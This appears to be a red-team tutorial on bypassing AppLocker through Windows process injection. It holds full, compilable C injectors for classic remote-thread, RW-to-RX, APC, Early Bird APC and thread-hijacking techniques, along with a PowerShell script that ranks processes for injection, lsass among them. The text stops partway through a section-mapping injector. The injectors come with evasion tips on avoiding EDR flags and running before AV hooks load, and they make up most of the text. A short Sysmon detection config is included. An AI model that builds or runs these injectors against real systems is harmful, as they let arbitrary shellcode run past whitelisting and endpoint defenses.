---
title: "AppLocker Bypass: Process Injection"
date: 2026-03-06
description: "Process injection techniques for AppLocker-constrained environments — DLL injection, PE injection, APC injection, and process hollowing — with C# implementations and Sysmon-based detection."
tags: ["applocker", "bypass", "process-injection", "process-hollowing", "apc", "evasion", "windows", "blueteam"]
---

> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1055](https://attack.mitre.org/techniques/T1055/) (Process Injection), [T1055.001](https://attack.mitre.org/techniques/T1055/001/) (DLL Injection), [T1055.002](https://attack.mitre.org/techniques/T1055/002/) (PE Injection), [T1055.004](https://attack.mitre.org/techniques/T1055/004/) (APC Injection), and [T1055.012](https://attack.mitre.org/techniques/T1055/012/) (Process Hollowing).

---

## Lab Setup

### Recommended VM Stack

``` {linenos=inline}
Host Machine
└── Hypervisor (VMware Workstation / VirtualBox / Hyper-V)
    ├── Windows 10/11 Enterprise x64 (victim VM)
    │   ├── Windows Defender enabled + updated
    │   ├── AppLocker default rules active
    │   ├── Sysmon (SwiftOnSecurity config)
    │   ├── x64dbg (dynamic analysis + injection debugging)
    │   ├── Process Hacker 2 (live memory / handle inspection)
    │   ├── API Monitor (track Win32 API calls per-process)
    │   ├── Sysinternals Suite (Process Monitor, VMMap)
    │   └── WinDbg (kernel-level debugging, optional)
    │
    └── Kali Linux (attacker VM)
        ├── mingw-w64 cross-compiler (x64 + x86)
        ├── Python 3.10+ with pefile, keystone-engine
        ├── nasm (shellcode assembly)
        └── netcat / rlwrap
```

### Windows VM Configuration

**1. Install and configure debugging tools**

```powershell {linenos=inline}
# x64dbg — process injection debugger
# Download from https://x64dbg.com and extract to C:\Tools\x64dbg

# Process Hacker 2
winget install ProcessHacker.ProcessHacker

# Sysinternals
winget install Microsoft.Sysinternals

# Enable kernel debugging symbols
$env:_NT_SYMBOL_PATH = "srv*C:\Symbols*https://msdl.microsoft.com/download/symbols"
```

**2. Enable verbose Sysmon logging for injection detection**

```powershell {linenos=inline}
# sysmon-inject.xml — targeted config for catching injections
@"
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <RuleGroup name="ProcessAccess" groupRelation="or">
      <ProcessAccess onmatch="include">
        <GrantedAccess condition="contains">0x1F0FFF</GrantedAccess>
        <GrantedAccess condition="contains">0x1FFFFF</GrantedAccess>
        <GrantedAccess condition="contains">0x40</GrantedAccess>
      </ProcessAccess>
    </RuleGroup>
    <RuleGroup name="CreateRemoteThread" groupRelation="or">
      <CreateRemoteThread onmatch="include">
        <SourceImage condition="is not">C:\Windows\System32\csrss.exe</SourceImage>
      </CreateRemoteThread>
    </RuleGroup>
    <RuleGroup name="ImageLoad" groupRelation="or">
      <ImageLoad onmatch="include">
        <Signed condition="is">false</Signed>
      </ImageLoad>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
"@ | Out-File sysmon-inject.xml -Encoding UTF8

.\Sysmon64.exe -c sysmon-inject.xml
```

**3. Build environment on Kali**

```bash
# cross-compilers
sudo apt install mingw-w64 nasm -y

# Python tooling
pip install keystone-engine pefile capstone

# verify x64 target compilation
echo 'int main(){return 0;}' > test.c
x86_64-w64-mingw32-gcc -o test.exe test.c && echo "x64 toolchain OK"
```

**4. Set up target processes for injection testing**

```powershell
# launch known-good injectable processes for testing
Start-Process notepad.exe        # simple, always available
Start-Process "C:\Windows\System32\mspaint.exe"
Start-Process explorer.exe       # rich target — many threads, alertable waits

# get their PIDs
Get-Process notepad, mspaint, explorer | Select Name, Id, SessionId
```

**5. Process Hacker — configure for injection monitoring**

```
Process Hacker → Hacker → Options → Advanced
    ☑ Enable kernel-mode driver (better visibility)
    ☑ Highlight: Processes with injected DLLs

Right-click any process → Properties → Memory
    → Watch for non-image RWX regions — sign of shellcode injection
```

**6. API Monitor — capture injection calls**

```
API Monitor → File → Monitor New Process → notepad.exe
Filter: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread,
        NtMapViewOfSection, QueueUserAPC, SetThreadContext
```

**7. Snapshot baseline**

```
Snapshot → "INJECTION_BASELINE"
```

Revert between techniques: injected shellcode lingering in target processes will skew subsequent tests.

---

## Why Process Injection Bypasses AppLocker

AppLocker evaluates processes at **creation time**. It checks the binary on disk, validates it against publisher/path/hash rules, and makes an allow/deny decision. That's the entire window it has.

Process injection sidesteps that window entirely:

```
AppLocker evaluates:    notepad.exe   ← trusted, signed, allowed
                              │
AppLocker stops here          │
                              │   VirtualAllocEx()
                              │   WriteProcessMemory()  ← your shellcode
                              │   CreateRemoteThread()
                              ▼
                    shellcode executes inside notepad.exe
                    notepad.exe is the process — AppLocker already approved it
                    no new process = no new AppLocker evaluation
```

Your payload inherits the host process's:
- AppLocker trust level
- Process token and privileges
- Network identity
- Parent process ancestry

The target process is the disguise. AppLocker never sees what runs inside it.

---

## Tool 0 — Find Injectable Processes

Before injecting anything, find the best targets: processes that are trusted, stable, and have the right architecture.

```powershell {linenos=inline}
# Find-InjectableProcesses.ps1
# Scores running processes by injection suitability:
#   - is it signed / trusted?
#   - does it match our bitness?
#   - is it stable enough to survive injection?
#   - do we have PROCESS_ALL_ACCESS?

param(
    [switch]$x86Only,
    [switch]$x64Only,
    [switch]$Verbose
)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ProcHelper {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(
        uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] public static extern bool IsWow64Process(
        IntPtr h, out bool wow64);

    public const uint PROCESS_ALL_ACCESS       = 0x1F0FFF;
    public const uint PROCESS_QUERY_INFO       = 0x0400;
    public const uint PROCESS_VM_READ          = 0x0010;
}
"@

# stable, high-value injection targets
$preferred = @(
    'explorer','notepad','mspaint','calc','svchost',
    'RuntimeBroker','SearchHost','sihost','ctfmon',
    'taskhostw','dwm','spoolsv','lsass'
)

$results = [Collections.Generic.List[PSCustomObject]]::new()

Get-Process -ErrorAction SilentlyContinue |
Where-Object { $_.Id -ne $PID -and $_.Id -ne 0 -and $_.Id -ne 4 } |
ForEach-Object {
    $proc = $_
    $score = 0

    # can we open with full access?
    $hProc = [ProcHelper]::OpenProcess(
        [ProcHelper]::PROCESS_ALL_ACCESS, $false, $proc.Id)
    $canOpen = $hProc -ne [IntPtr]::Zero

    if ($canOpen) {
        $score += 3
        # check bitness
        $isWow64 = $false
        [ProcHelper]::IsWow64Process($hProc, [ref]$isWow64) | Out-Null
        $is32bit = $isWow64
        [ProcHelper]::CloseHandle($hProc) | Out-Null
    } else {
        $is32bit = $false
    }

    # filter by arch
    if ($x86Only -and -not $is32bit) { return }
    if ($x64Only -and $is32bit)      { return }

    # is it signed?
    $signed = $false
    try {
        $path   = $proc.MainModule.FileName
        $sig    = Get-AuthenticodeSignature $path -ErrorAction SilentlyContinue
        $signed = $sig.Status -eq 'Valid'
        if ($signed) { $score += 2 }
    } catch {}

    # preferred process name bonus
    if ($preferred -contains $proc.Name.ToLower()) { $score += 2 }

    # session 0 = system processes, noisier to inject
    if ($proc.SessionId -gt 0) { $score += 1 }

    $results.Add([PSCustomObject]@{
        PID      = $proc.Id
        Name     = $proc.Name
        Arch     = if ($is32bit) { 'x86' } else { 'x64' }
        Signed   = $signed
        CanOpen  = $canOpen
        Score    = $score
        Session  = $proc.SessionId
    })
}

$ranked = $results | Where-Object { $_.CanOpen } |
          Sort-Object Score -Descending

Write-Host "`n[+] Injectable processes (ranked by suitability):`n" -ForegroundColor Green
$ranked | Format-Table -AutoSize

$ranked | Export-Csv ".\injectable_procs.csv" -NoTypeInformation
Write-Host "[*] saved → injectable_procs.csv"

# top pick
$top = $ranked | Select-Object -First 1
if ($top) {
    Write-Host "`n[*] recommended target: $($top.Name) (PID $($top.PID)) — score $($top.Score)" `
        -ForegroundColor Cyan
}
```

---

## Technique 1 — Classic Shellcode Injection

The foundational technique. Allocate memory in a remote process, write shellcode, create a thread to execute it. Loud but reliable, good for validating your shellcode before moving to stealthier methods.

```c {linenos=inline}
/* classic_inject.c
 * Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread injection.
 * Usage: classic_inject.exe <PID> <shellcode.bin>
 *        cat shellcode.bin | classic_inject.exe <PID>
 *
 * Compile (x64):
 *   x86_64-w64-mingw32-gcc -o classic_inject.exe classic_inject.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static uint8_t *load_shellcode(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    *out_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *buf = (uint8_t*)malloc(*out_len);
    fread(buf, 1, *out_len, f);
    fclose(f);
    return buf;
}

static uint8_t *load_stdin(size_t *out_len) {
    uint8_t  tmp[65536];
    *out_len = fread(tmp, 1, sizeof(tmp), stdin);
    if (*out_len == 0) return NULL;
    uint8_t *buf = (uint8_t*)malloc(*out_len);
    memcpy(buf, tmp, *out_len);
    return buf;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <pid> [shellcode.bin]\n"
                        "       cat sc.bin | %s <pid>\n", argv[0], argv[0]);
        return 1;
    }

    DWORD    pid = (DWORD)atoi(argv[1]);
    size_t   sc_len = 0;
    uint8_t *sc     = (argc >= 3)
        ? load_shellcode(argv[2], &sc_len)
        : load_stdin(&sc_len);

    if (!sc || sc_len == 0) {
        fprintf(stderr, "[-] no shellcode loaded\n");
        return 1;
    }

    printf("[*] target PID   : %lu\n", pid);
    printf("[*] shellcode len: %zu bytes\n", sc_len);

    /* open target process */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess failed: %lu\n", GetLastError());
        free(sc);
        return 1;
    }

    /* allocate RWX in remote process */
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        fprintf(stderr, "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProc);
        free(sc);
        return 1;
    }
    printf("[*] remote alloc : %p\n", pRemote);

    /* write shellcode */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, pRemote, sc, sc_len, &written)
        || written != sc_len) {
        fprintf(stderr, "[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        free(sc);
        return 1;
    }
    printf("[*] wrote %zu bytes\n", written);

    /* wipe local copy */
    SecureZeroMemory(sc, sc_len);
    free(sc);

    /* spawn remote thread */
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemote,
        NULL, 0, NULL);
    if (!hThread) {
        fprintf(stderr, "[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    printf("[+] remote thread: %p — shellcode executing\n", hThread);
    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

```bash
# compile
x86_64-w64-mingw32-gcc -o classic_inject.exe classic_inject.c \
    -s -mwindows -Wl,--build-id=none

# inject into notepad (PID from Find-InjectableProcesses.ps1)
./classic_inject.exe 1234 shellcode.bin

# pipe encrypted shellcode — decrypt externally first
python3 encrypt_sc.py -i raw.bin -k 0x42 | ./classic_inject.exe 1234
```

---

## Technique 2 — RW→RX Two-Stage Injection (No RWX)

The classic technique allocates `PAGE_EXECUTE_READWRITE`, an instant EDR flag. This variant allocates `PAGE_READWRITE` first, writes the shellcode, then flips to `PAGE_EXECUTE_READ` before threading. The memory is never simultaneously writable and executable.

```c {linenos=inline}
/* rwrx_inject.c
 * Two-stage injection: RW alloc → write → mprotect to RX → thread.
 * Avoids the RWX signature without using direct syscalls.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o rwrx_inject.exe rwrx_inject.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* rolling XOR decrypt matching encrypt_sc.py scheme */
static void xor_decrypt(uint8_t *buf, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= (uint8_t)((key + i) & 0xff);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr,
            "usage: %s <pid> <shellcode.bin> [xor_key_hex]\n", argv[0]);
        return 1;
    }

    DWORD  pid = (DWORD)atoi(argv[1]);
    uint8_t key = (argc >= 4) ? (uint8_t)strtol(argv[3], NULL, 16) : 0;

    /* load shellcode */
    FILE  *f = fopen(argv[2], "rb");
    if (!f) { perror("[-] fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t sc_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *sc = (uint8_t*)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    if (key) {
        xor_decrypt(sc, sc_len, key);
        printf("[*] decrypted with key 0x%02x\n", key);
    }

    /* open with minimal required access */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_CREATE_THREAD,
        FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        free(sc);
        return 1;
    }

    /* stage 1: alloc RW */
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);          /* NOT RWX */
    if (!pRemote) {
        fprintf(stderr, "[-] VirtualAllocEx: %lu\n", GetLastError());
        CloseHandle(hProc);
        free(sc);
        return 1;
    }
    printf("[*] stage1 RW alloc : %p (%zu bytes)\n", pRemote, sc_len);

    /* stage 2: write shellcode */
    SIZE_T written = 0;
    WriteProcessMemory(hProc, pRemote, sc, sc_len, &written);
    SecureZeroMemory(sc, sc_len);
    free(sc);
    printf("[*] stage2 written  : %zu bytes\n", written);

    /* stage 3: flip RW → RX (no write permission at execution time) */
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProc, pRemote, sc_len,
                          PAGE_EXECUTE_READ, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtectEx: %lu\n", GetLastError());
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }
    printf("[*] stage3 RW → RX  : done\n");

    /* stage 4: execute */
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)pRemote,
        NULL, 0, NULL);

    if (!hThread) {
        fprintf(stderr, "[-] CreateRemoteThread: %lu\n", GetLastError());
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return 1;
    }

    printf("[+] thread %p executing at %p\n", hThread, pRemote);
    WaitForSingleObject(hThread, 8000);

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

---

## Technique 3 — APC Injection

Asynchronous Procedure Calls (APCs) allow queuing a function to execute in the context of a specific thread. When a thread enters an **alertable wait** (via `SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`), it drains its APC queue. Queue your shellcode as an APC to an alertable thread, and it executes under that thread's identity.

No `CreateRemoteThread`. The thread already exists.

```c {linenos=inline}
/* apc_inject.c
 * APC injection — queue shellcode as APC to all threads of target process.
 * Queuing to all threads maximises the chance one is in an alertable wait.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o apc_inject.exe apc_inject.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* enumerate all thread IDs for a given PID */
static DWORD *get_thread_ids(DWORD pid, int *count) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;

    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD *ids = NULL;
    *count = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                ids = (DWORD*)realloc(ids, (*count + 1) * sizeof(DWORD));
                ids[(*count)++] = te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return ids;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <pid> <shellcode.bin>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    /* load shellcode */
    FILE *f = fopen(argv[2], "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t sc_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *sc = (uint8_t*)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    /* open process and allocate shellcode */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess failed: %lu\n", GetLastError());
        free(sc);
        return 1;
    }

    /* RW alloc → write → RX flip */
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, pRemote, sc, sc_len, NULL);
    SecureZeroMemory(sc, sc_len);
    free(sc);

    DWORD old = 0;
    VirtualProtectEx(hProc, pRemote, sc_len, PAGE_EXECUTE_READ, &old);

    printf("[*] shellcode at %p — queueing APCs\n", pRemote);

    /* enumerate threads and queue APC to each */
    int    tcount = 0;
    DWORD *tids   = get_thread_ids(pid, &tcount);
    int    queued = 0;

    for (int i = 0; i < tcount; i++) {
        HANDLE hThread = OpenThread(
            THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
            FALSE, tids[i]);
        if (!hThread) continue;

        if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0)) {
            printf("[+] APC queued to TID %lu\n", tids[i]);
            queued++;
        }
        CloseHandle(hThread);
    }
    free(tids);
    CloseHandle(hProc);

    printf("[*] queued to %d/%d threads — shellcode fires on next alertable wait\n",
           queued, tcount);
    return 0;
}
```

---

## Technique 4 — Early Bird APC Injection

Early Bird is the stealth upgrade to plain APC. Instead of targeting an existing process (whose threads may never enter alertable waits), we:

1. Spawn a trusted process **suspended**
2. Inject shellcode before it runs a single line of code
3. Queue APC to the main thread
4. Resume — the APC fires before any process initialization, before AV hooks load

No alertable wait required. The APC executes during thread initialization, a window that most AV products don't monitor.

```c {linenos=inline}
/* earlybird.c
 * Early Bird APC injection.
 * Spawns a suspended trusted process, injects, queues APC, resumes.
 * Shellcode runs before process initialization completes.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o earlybird.exe earlybird.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* rolling XOR decrypt */
static void xor_decrypt(uint8_t *buf, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++)
        buf[i] ^= (uint8_t)((key + i) & 0xff);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr,
            "usage: %s <shellcode.bin> [xor_key] [host_exe]\n"
            "  host_exe default: C:\\Windows\\System32\\notepad.exe\n",
            argv[0]);
        return 1;
    }

    uint8_t  key      = (argc >= 3) ? (uint8_t)strtol(argv[2], NULL, 16) : 0;
    char    *host_exe = (argc >= 4) ? argv[3]
                                    : "C:\\Windows\\System32\\notepad.exe";

    /* load and decrypt shellcode */
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t sc_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *sc = (uint8_t*)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    if (key) xor_decrypt(sc, sc_len, key);

    printf("[*] host  : %s\n", host_exe);
    printf("[*] sc len: %zu bytes\n", sc_len);
    printf("[*] key   : 0x%02x\n", key);

    /* spawn host process suspended */
    STARTUPINFOA        si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    if (!CreateProcessA(NULL, host_exe, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed: %lu\n", GetLastError());
        free(sc);
        return 1;
    }
    printf("[+] spawned suspended PID %lu TID %lu\n", pi.dwProcessId, pi.dwThreadId);

    /* alloc RW in suspended process */
    LPVOID pRemote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        fprintf(stderr, "[-] VirtualAllocEx: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        free(sc);
        return 1;
    }

    /* write shellcode */
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, pRemote, sc, sc_len, &written);
    SecureZeroMemory(sc, sc_len);
    free(sc);
    printf("[*] wrote %zu bytes at %p\n", written, pRemote);

    /* flip RW → RX */
    DWORD old = 0;
    VirtualProtectEx(pi.hProcess, pRemote, sc_len, PAGE_EXECUTE_READ, &old);
    printf("[*] memory: RW → RX\n");

    /* queue APC to main thread (thread is still suspended — fires on resume) */
    if (!QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] APC queued to main thread\n");

    /* resume — APC fires before ntdll.dll finishes initializing */
    ResumeThread(pi.hThread);
    printf("[+] thread resumed — shellcode executing\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

```bash
# compile
x86_64-w64-mingw32-gcc -o earlybird.exe earlybird.c -s -mwindows -Wl,--build-id=none

# inject into fresh notepad
./earlybird.exe shellcode.bin

# with XOR key, custom host
./earlybird.exe enc_shellcode.bin 42 "C:\Windows\System32\mspaint.exe"
```

---

## Technique 5 — Thread Hijacking

No new threads at all. Find a running thread in the target, suspend it, redirect its instruction pointer to your shellcode, resume. The shellcode executes on a thread that was already there: no `CreateRemoteThread`, no APC.

```c {linenos=inline}
/* thread_hijack.c
 * Thread context hijacking — redirect existing thread RIP to shellcode.
 * Quietest single-thread technique: no new threads, no APC queue.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o thread_hijack.exe thread_hijack.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* find first accessible thread of target PID */
static DWORD find_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                /* try to open it */
                HANDLE h = OpenThread(
                    THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                    THREAD_SET_CONTEXT,
                    FALSE, te.th32ThreadID);
                if (h) {
                    tid = te.th32ThreadID;
                    CloseHandle(h);
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <pid> <shellcode.bin>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    FILE *f = fopen(argv[2], "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
    size_t sc_len = (size_t)ftell(f);
    rewind(f);
    uint8_t *sc = (uint8_t*)malloc(sc_len);
    fread(sc, 1, sc_len, f);
    fclose(f);

    /* open process */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "[-] OpenProcess: %lu\n", GetLastError());
        free(sc);
        return 1;
    }

    /* alloc + write shellcode */
    LPVOID pSC = VirtualAllocEx(hProc, NULL, sc_len,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, pSC, sc, sc_len, NULL);
    SecureZeroMemory(sc, sc_len);
    free(sc);

    DWORD old = 0;
    VirtualProtectEx(hProc, pSC, sc_len, PAGE_EXECUTE_READ, &old);
    printf("[*] shellcode at %p\n", pSC);

    /* find and open a thread */
    DWORD tid = find_thread(pid);
    if (!tid) {
        fprintf(stderr, "[-] no accessible thread found\n");
        CloseHandle(hProc);
        return 1;
    }
    printf("[*] target thread: TID %lu\n", tid);

    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE, tid);
    if (!hThread) {
        fprintf(stderr, "[-] OpenThread: %lu\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }

    /* suspend thread */
    SuspendThread(hThread);
    printf("[*] thread suspended\n");

    /* get current context — we need the full CONTEXT for x64 */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        fprintf(stderr, "[-] GetThreadContext: %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProc);
        return 1;
    }

    printf("[*] original RIP: 0x%016llx\n", ctx.Rip);

    /*
     * Build a small trampoline in the remote process that:
     *   1. saves all registers (preserves thread state)
     *   2. calls our shellcode
     *   3. restores registers
     *   4. jumps back to the original RIP
     *
     * This keeps the hijacked thread stable after shellcode returns.
     */
    uint64_t orig_rip = ctx.Rip;

    /* minimal trampoline: pushall → call sc → popall → jmp orig_rip
     * For a reverse shell sc that never returns, we can simplify to jmp sc */
    uint8_t tramp[14] = {
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,   /* JMP QWORD PTR [RIP+0] */
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* address placeholder */
    };
    /* patch in the shellcode address */
    *(uint64_t*)(tramp + 6) = (uint64_t)pSC;

    /* alloc trampoline region */
    LPVOID pTramp = VirtualAllocEx(hProc, NULL, sizeof(tramp),
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, pTramp, tramp, sizeof(tramp), NULL);
    VirtualProtectEx(hProc, pTramp, sizeof(tramp), PAGE_EXECUTE_READ, &old);

    /* redirect RIP to trampoline */
    ctx.Rip = (DWORD64)pTramp;
    SetThreadContext(hThread, &ctx);

    printf("[*] RIP redirected → trampoline %p → shellcode %p\n", pTramp, pSC);

    /* resume thread */
    ResumeThread(hThread);
    printf("[+] thread resumed — executing shellcode\n");

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

---

## Technique 6 — NtMapViewOfSection (Shared Memory Injection)

Section-based injection avoids `WriteProcessMemory` entirely, one of the most-monitored injection APIs. Instead, we create a shared memory section, map it into both our process and the target, write shellcode into our local mapping (which the target sees simultaneously), then thread into it.

```c {linenos=inline}
/* section_inject.c
 * NtMapViewOfSection injection — no WriteProcessMemory, no VirtualAllocEx.
 * Uses shared memory section to deliver shellcode to target process.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o section_inject.exe section_inject.c \
 *       -s -mwindows -Wl,--build-id=none
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

/* NT API typedefs */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize,
    DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS (NTAPI *pRtlCreateUserThread)(
    HANDLE ProcessHandle, PSECURITY_DESCRIPTOR SecurityDescriptor,
    BOOLEAN CreateSuspended, ULONG StackZeroBits,
    PULONG StackReserved, PULONG StackCommit,
    PVOID StartAddress, PVOID StartParameter,
    PHANDLE ThreadHandle, PCLIENT_ID ClientId);

#define STATUS_SUCCESS               0x00000000
#define SECTION_ALL_ACCESS           0x0F001F
#define SEC_COMMIT                   0x08000000
#define PAGE_EXECUTE_READ            0x20
#define PAGE_READWRITE               0x04
#define ViewShare                    1

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <pid> <shellcode.bin>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);

    FILE *f = fopen(argv[2], "rb");
    if (!f) { perror("fopen"); return 1; }
    fseek(f, 0, SEEK_END);
